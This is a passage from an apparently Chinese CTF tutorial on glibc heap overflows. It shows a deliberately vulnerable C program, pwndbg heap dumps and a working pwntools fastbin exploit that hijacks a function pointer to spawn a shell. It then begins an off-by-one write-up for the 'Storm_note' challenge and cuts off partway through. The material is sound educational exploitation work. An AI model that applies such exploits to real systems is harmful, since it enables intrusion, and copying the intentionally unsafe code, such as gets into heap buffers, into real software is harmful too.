<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -no-pie overflow.c -o overflow -g -w</span><br></pre></td></tr></table></figure>
<p>我们把断点下好观察chunk变化</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">root@Thunder_J-virtual-machine:~/桌面# gdb overflow </span><br><span class="line">...</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> b 8</span></span><br><span class="line">Breakpoint 1 at 0x400599: file overflow.c, line 8.</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> b 9</span></span><br><span class="line">Breakpoint 2 at 0x4005aa: file overflow.c, line 9.</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> r</span></span><br><span class="line">Starting program: /home/Thunder_J/桌面/overflow </span><br><span class="line">Get input:</span><br><span class="line"></span><br><span class="line">Breakpoint 1, main () at overflow.c:8</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x602250-16</span></span><br><span class="line">0x602240:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602250:	0x0000000000000000	0x0000000000000021 # 申请的chunk</span><br><span class="line">0x602260:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602270:	0x0000000000000000	0x0000000000000411 # next chunk</span><br><span class="line">0x602280:	0x75706e6920746547	0x00000000000a3a74</span><br><span class="line">0x602290:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6022a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6022b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6022c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6022d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br><span class="line">Continuing.</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # 输入64个'a'覆盖下一个chunk</span><br><span class="line"></span><br><span class="line">Breakpoint 2, main () at overflow.c:9</span><br><span class="line">9	  return 0;</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x602250-16</span></span><br><span class="line">0x602240:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602250:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x602260:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x602270:	0x6161616161616161	0x6161616161616161 # next chunk已经被覆盖</span><br><span class="line">0x602280:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x602290:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6022a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6022b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6022c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6022d0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>上面就是简单的堆溢出演示，在利用的时候当然不是这么的随便下面就看第二个例子。</p>
<h3 id="Example-Two-2"><a href="#Example-Two-2" class="headerlink" title="Example Two"></a>Example Two</h3><p>创建Overflow_Free_Chunk.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sh</span><span class="params">(<span class="keyword">char</span> *cmd)</span></span>&#123;</span><br><span class="line">	system(cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">int</span> cmd,idx,sz;</span><br><span class="line">	<span class="keyword">char</span>* ptr[<span class="number">10</span>];</span><br><span class="line">	<span class="built_in">memset</span>(ptr,<span class="number">0</span>,<span class="keyword">sizeof</span>(ptr));</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"1. malloc + gets\n2. free\n3. puts"</span>);</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;cmd,&amp;idx);</span><br><span class="line">		idx %= <span class="number">10</span>;</span><br><span class="line">		<span class="keyword">if</span>(cmd==<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">"%d%*c"</span>,&amp;sz);</span><br><span class="line">			ptr[idx] = <span class="built_in">malloc</span>(sz);</span><br><span class="line">			gets(ptr[idx]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (cmd==<span class="number">2</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">free</span>(ptr[idx]);</span><br><span class="line">			ptr[idx] = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (cmd==<span class="number">3</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">puts</span>(ptr[idx]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -no-pie Overflow_Free_Chunk.c -o Overflow_Free_Chunk -g -w</span><br></pre></td></tr></table></figure>
<p>我们在scanf输入处下断点观察</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> b 20</span></span><br><span class="line">Breakpoint 1 at 0x40085b: file Overflow_Free_Chunk.c, line 20.</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> r</span></span><br><span class="line">Starting program: /home/Thunder_J/桌面/Overflow_Free_Chunk </span><br><span class="line">1. malloc + gets</span><br><span class="line">2. free</span><br><span class="line">3. puts</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line">Breakpoint 1, main () at Overflow_Free_Chunk.c:20</span><br><span class="line">20			scanf("%d %d",&amp;cmd,&amp;idx);</span><br></pre></td></tr></table></figure>
<p>我们申请两次大小为24的chunk，为什么要申请24呢，因为最小的chunk大小为32位，，最小的堆即为prev_size(可以被上一个chunk占用)，size，fd(可以被本chunk占用)，bk(可以被本chunk占用) ，8*4即为32位，我们看一下堆的结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>我们知道，我们申请出来的chunk最少是32位，然而chunk的大小至少是16的倍数，我们申请小于24位的chunk，其实申请出来大小是32位，也就是：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prev_size + size + fd + bk</span><br></pre></td></tr></table></figure>
<p>我们申请两次chunk之后的情况：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br><span class="line">Continuing.</span><br><span class="line">1 0</span><br><span class="line">24 aaaaaaaa</span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br><span class="line">Continuing.</span><br><span class="line">1 1</span><br><span class="line">24 bbbbbbbb</span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x602660-16</span></span><br><span class="line">0x602650:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602660:	0x0000000000000000	0x0000000000000021 # prev_size + size</span><br><span class="line">0x602670:	0x6161616161616161	0x0000000000000000 # fd + bk</span><br><span class="line">0x602680:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x602690:	0x6262626262626262	0x0000000000000000 # 同上</span><br><span class="line">0x6026a0:	0x0000000000000000	0x0000000000020961</span><br><span class="line">0x6026b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026e0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>我们释放两次chunk之后的情况：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br><span class="line">Continuing.</span><br><span class="line">2 1</span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br><span class="line">Continuing.</span><br><span class="line">2 0</span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x602660-16</span></span><br><span class="line">0x602650:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602660:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x602670:	0x0000000000602690	0x0000000000000000</span><br><span class="line">0x602680:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x602690:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026a0:	0x0000000000000000	0x0000000000020961</span><br><span class="line">0x6026b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026e0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>因为fastbin是单链表，所以我们free两次会得到一个单链表:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">Fastbin[1]-&gt;</span><span class="bash">0x602670-&gt;0x602690</span></span><br></pre></td></tr></table></figure>
<p>当我们再次申请相同大小的chunk的时候，作合适的写入操作就可以覆盖下一个chunk的内容：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br><span class="line">Continuing.</span><br><span class="line">1 2</span><br><span class="line">24 cccccccccccccccccccccccccccccccc</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x602660-16</span></span><br><span class="line">0x602650:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602660:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x602670:	0x6363636363636363	0x6363636363636363</span><br><span class="line">0x602680:	0x6363636363636363	0x6363636363636363</span><br><span class="line">0x602690:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026a0:	0x0000000000000000	0x0000000000020961</span><br><span class="line">0x6026b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026e0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>我们需要注意的第一点是，我们free的顺序不能乱，一旦乱了，就会导致无法覆盖到理想的chunk处，要深入理解fastbin的LIFO机制，也就是想象成栈的机制，最好的理解方式就是自己多试几次，我们需要注意的第二点是我们不能一直乱覆盖到下一个chunk的size大小，因为size代表这个chunk的大小，要是乱覆盖用‘cccccccc’替代size内容那这个chunk的大小就变成了0x6363636363636363，就不是fastbin的大小了，也就无法达到目的了，所以我们必须选择好偏移的位置，将size大小正确写入下一个chunk，然后将chunk的fd指向我们的free函数地址，然后将’sh’写入free函数的地方。</p>
<p><strong>exp</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./Overflow_Free_Chunk'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(i,s)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">	p.send(<span class="string">'1 %d\n24 %s'</span>%(i,s)+<span class="string">'\n'</span>)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(x)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">	p.send(<span class="string">'2 %d'</span>%x+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0</span>,<span class="string">'aaaaaaaa'</span>)</span><br><span class="line">malloc(<span class="number">1</span>,<span class="string">'bbbbbbbb'</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">malloc(<span class="number">2</span>,<span class="string">'a'</span>*<span class="number">24</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0x601018</span>)) <span class="comment"># free_hook</span></span><br><span class="line">malloc(<span class="number">3</span>,<span class="string">'sh'</span>) <span class="comment"># write 'sh' in ptr[3]</span></span><br><span class="line">malloc(<span class="number">4</span>, p64(<span class="number">0x4007d7</span>)) <span class="comment"># write in sh() address</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'2 3'</span>) <span class="comment"># free(3) ==&gt; system('sh')</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off-By-One"></a>Off-By-One</h2><p>off-by-one是堆溢出中比较有意思的一类漏洞，漏洞主要原理是 malloc 本来分配了0x20的内存，结果可以写 0x21 字节的数据，多写了一个，影响了下一个内存块的头部信息，进而造成了被利用的可能，这里就以西湖论剑的一道题目来讲解这个漏洞</p>
<p><strong>题目链接</strong></p>
<p><a href="http://file.eonew.cn/ctf/pwn/Storm_note" target="_blank" rel="noopener">http://file.eonew.cn/ctf/pwn/Storm_note</a></p>
<p><strong>解题思路</strong></p>
<p>首先检测一下程序检测，该开的都开了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Thunder_J@Thunder_J-virtual-machine:~/桌面$ checksec Storm_note </span><br><span class="line">[*] <span class="string">'/home/Thunder_J/\xe6\xa1\x8c\xe9\x9d\xa2/Storm_note'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>首先用IDA观察一下程序，有delete_note，backdoor，alloc_note，edit_note四个功能</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      _isoc99_scanf(<span class="string">"%d"</span>, &amp;v3);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      delete_note();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">666</span> )</span><br><span class="line">        backdoor();</span><br><span class="line">LABEL_15:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      alloc_note();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">      edit_note();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h3 id="init-proc"><a href="#init-proc" class="headerlink" title="init_proc"></a>init_proc</h3><p>程序执行之前有这个初始化函数，可以看到关闭了 fastbin 机制</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> init_proc()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( !mallopt(<span class="number">1</span>, <span class="number">0</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( mmap((<span class="keyword">void</span> *)<span class="number">0xABCD0000</span>LL, <span class="number">0x1000</span>uLL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0L</span>L) != (<span class="keyword">void</span> *)<span class="number">2882338816L</span>L )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  fd = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  result = read(fd, (<span class="keyword">void</span> *)<span class="number">0xABCD0100</span>LL, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( result != <span class="number">48</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="alloc-note"><a href="#alloc-note" class="headerlink" title="alloc_note"></a>alloc_note</h3><p>可以看到输入size之后，程序会calloc一块内存(calloc类比malloc)，存放note，而note_size则存放在note后面</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span> &amp;&amp; note[i]; ++i )</span><br><span class="line">  ;</span><br><span class="line"><span class="keyword">if</span> ( i == <span class="number">16</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"full!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"size ?"</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">0xFFFFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    note[i] = <span class="built_in">calloc</span>(v1, <span class="number">1u</span>LL);</span><br><span class="line">    note_size[i] = v1;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Done"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid size"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>note存放信息如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">bss:<span class="number">0000000000202060</span> ?? ?? ?? ?? ?? ??+note_size dd <span class="number">10</span><span class="function">h <span class="title">dup</span><span class="params">(?)</span>       </span>; DATA XREF: alloc_note+E1↑o</span><br><span class="line">.bss:<span class="number">0000000000202060</span> ?? ?? ?? ?? ?? ??+                              ; edit_note+<span class="number">8</span>E↑o</span><br><span class="line">.bss:<span class="number">0000000000202060</span> ?? ?? ?? ?? ?? ??+                              ; delete_note+BE↑o</span><br><span class="line">.bss:<span class="number">00000000002020</span>A0                   <span class="keyword">public</span> note</span><br><span class="line">.bss:<span class="number">00000000002020</span>A0                   ; _QWORD note[<span class="number">16</span>]</span><br><span class="line">.bss:<span class="number">00000000002020</span>A0 ?? ?? ?? ?? ?? ??+note dq <span class="number">10</span><span class="function">h <span class="title">dup</span><span class="params">(?)</span>            </span>; DATA XREF: alloc_note+<span class="number">2</span>D↑o</span><br><span class="line">.bss:<span class="number">00000000002020</span>A0 ?? ?? ?? ?? ?? ??+                              ; alloc_note+C6↑o</span><br><span class="line">.bss:<span class="number">00000000002020</span>A0 ?? ?? ?? ?? ?? ??+                              ; edit_note+<span class="number">57</span>↑o</span><br><span class="line">.bss:<span class="number">00000000002020</span>A0 ?? ?? ?? ?? ?? ??+                              ; edit_note+A8↑o</span><br><span class="line">.bss:<span class="number">00000000002020</span>A0 ?? ?? ?? ?? ?? ??+                              ; edit_note+D0↑o</span><br><span class="line">.bss:<span class="number">00000000002020</span>A0 ?? ?? ?? ?? ?? ??+                              ; delete_note+<span class="number">57</span>↑o</span><br><span class="line">.bss:<span class="number">00000000002020</span>A0 ?? ?? ?? ?? ?? ??+                              ; delete_note+<span class="number">82</span>↑o</span><br><span class="line">.bss:<span class="number">00000000002020</span>A0 ?? ?? ?? ?? ?? ??+                              ; delete_note+A2↑o</span><br><span class="line">.bss:<span 